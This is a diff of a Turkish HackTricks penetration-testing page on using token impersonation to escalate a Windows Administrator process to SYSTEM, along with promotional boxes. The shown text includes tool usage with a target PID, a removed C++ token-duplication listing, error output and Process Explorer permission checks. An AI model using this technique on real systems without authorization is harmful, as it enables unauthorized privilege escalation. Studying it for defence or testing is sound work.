@@ -1,87 +1,27 @@
+# Yüksekten Sistem'e SeImpersonate
+
 <details>
 
-<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'a katılın!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
-* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
+### Kod
 
-## Kod
-
-Aşağıdaki kod [buradan](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962) alınmıştır. **Bir İşlem Kimliği (PID) belirtebilirsiniz** ve belirtilen işlemin kullanıcısı olarak çalışan bir CMD çalıştırılacaktır.\
-Yüksek bütünlükte çalışan bir işlemde, Sistem olarak çalışan bir işlemin PID'sini (örneğin winlogon, wininit) belirtebilir ve bir cmd.exe'yi sistem olarak çalıştırabilirsiniz.
+Aşağıdaki kod [buradan](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962) alınmıştır. **Bir Process ID'si belirtmenizi sağlar** ve belirtilen işlemin kullanıcısı olarak çalışan bir CMD **çalıştırılacaktır**.\
+Yüksek Bütünlük işleminde çalıştırarak **Sistem olarak çalışan bir işlemin PID'sini belirtebilirsiniz** (örneğin winlogon, wininit) ve bir cmd.exe'yi sistem olarak çalıştırabilirsiniz.
 ```cpp
 impersonateuser.exe 1234
 ```
 {% code title="impersonateuser.cpp" %}
-
-```cpp
-#include <windows.h>
-
-int main()
-{
-    HANDLE hToken;
-    HANDLE hDupToken;
-    DWORD dwSessionId = 0;
-    DWORD dwProcessId = 0;
-    HANDLE hProcess;
-    HANDLE hThread;
-    LPVOID lpEnvironment = NULL;
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
-    BOOL bResult;
-
-    // Get the current session ID
-    dwSessionId = WTSGetActiveConsoleSessionId();
-
-    // Get the current process ID
-    dwProcessId = GetCurrentProcessId();
-
-    // Get the process handle
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
-
-    // Get the primary token of the process
-    bResult = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
-
-    // Enable the SeImpersonatePrivilege privilege
-    bResult = LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
-
-    // Duplicate the token
-    bResult = DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
-
-    // Impersonate the token
-    bResult = ImpersonateLoggedOnUser(hDupToken);
-
-    // Create a new process with the impersonated token
-    ZeroMemory(&si, sizeof(STARTUPINFO));
-    si.cb = sizeof(STARTUPINFO);
-    bResult = CreateProcessAsUser(hDupToken, NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, lpEnvironment, NULL, &si, &pi);
-
-    // Revert to the original token
-    bResult = RevertToSelf();
-
-    // Close the handles
-    CloseHandle(hToken);
-    CloseHandle(hDupToken);
-    CloseHandle(hProcess);
-
-    return 0;
-}
-```
-{% endcode %}
 ```cpp
 // From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
 
@@ -212,11 +152,9 @@ printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
 return 0;
 }
 ```
-{% endcode %}
+### Hata
 
-## Hata
-
-Bazı durumlarda, Sistem'i taklit etmeye çalışabilirsiniz ancak aşağıdaki gibi bir çıktı alarak çalışmayabilir:
+Bazı durumlarda Sistem'i taklit etmeye çalıştığınızda aşağıdaki gibi bir çıktı göstererek çalışmayabilir:
 ```cpp
 [+] OpenProcess() success!
 [+] OpenProcessToken() success!
@@ -228,37 +166,21 @@ Bazı durumlarda, Sistem'i taklit etmeye çalışabilirsiniz ancak aşağıdaki 
 [-] CreateProcessWithTokenW Error: 1326
 ```
 Bu, Yüksek Bütünlük seviyesinde çalışıyor olsanız bile **yeterli izinlere sahip olmadığınız** anlamına gelir.\
-Şu anda `svchost.exe` işlemleri üzerindeki mevcut Yönetici izinlerini **işlem gezgini** ile kontrol edelim (veya process hacker'ı da kullanabilirsiniz):
+`svchost.exe` işlemleri üzerinde mevcut Yönetici izinlerini **işlem gezgini** ile kontrol edelim (veya ayrıca işlem hacker'ı da kullanabilirsiniz):
 
-1. Bir `svchost.exe` işlemi seçin
-2. Sağ Tıkla --> Özellikler
-3. "Güvenlik" sekmesine girin ve sağ alt köşedeki "İzinler" düğmesine tıklayın
-4. "Gelişmiş"i tıklayın
-5. "Yöneticiler"i seçin ve "Düzenle"yi tıklayın
-6. "Gelişmiş izinleri göster"i tıklayın
+1. `svchost.exe` işlemlerinden birini seçin
+2. Sağ Tıklayın --> Özellikler
+3. "Güvenlik" sekmesine girin ve sağ alt köşede "İzinler" düğmesine tıklayın
+4. "Gelişmiş"e tıklayın
+5. "Yöneticiler"i seçin ve "Düzenle"ye tıklayın
+6. "Gelişmiş izinleri göster"e tıklayın
 
-![](<../../.gitbook/assets/image (322).png>)
+![](<../../.gitbook/assets/image (434).png>)
 
-Önceki görüntü, "Yöneticiler"in seçilen işlem üzerinde sahip olduğu tüm ayrıcalıkları içerir (svchost.exe için sadece "Sorgu" ayrıcalıklarına sahip olduklarını görebilirsiniz).
+Önceki görüntü, "Yöneticiler"in seçilen işlem üzerinde sahip olduğu tüm ayrıcalıkları içerir (`svchost.exe` için yalnızca "Sorgu" ayrıcalıklarına sahip olduklarını görebilirsiniz)
 
-`winlogon.exe` üzerinde "Yöneticiler"in sahip olduğu ayrıcalıklara bakın:
+`winlogon.exe` üzerinde "Yöneticiler"in sahip olduğu ayrıcalıkları görün:
 
-![](<../../.gitbook/assets/image (323).png>)
+![](<../../.gitbook/assets/image (1099).png>)
 
-Bu işlem içinde "Yöneticiler", muhtemelen bu işlem tarafından kullanılan belirteci taklit etmelerine izin veren "Belleği Oku" ve "İzinleri Oku" yetkilerine sahip olabilir.
-
-
-
-<details>
-
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>
-
-HackTricks'i desteklemenin diğer yolları:
-
-* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.
-
-</details>
+Bu işlemde "Yöneticiler", "Belleği Oku" ve "İzinleri Oku" yapabilir, bu da muhtemelen Yöneticilerin bu işlem tarafından kullanılan belirteci taklit etmelerine izin verir.
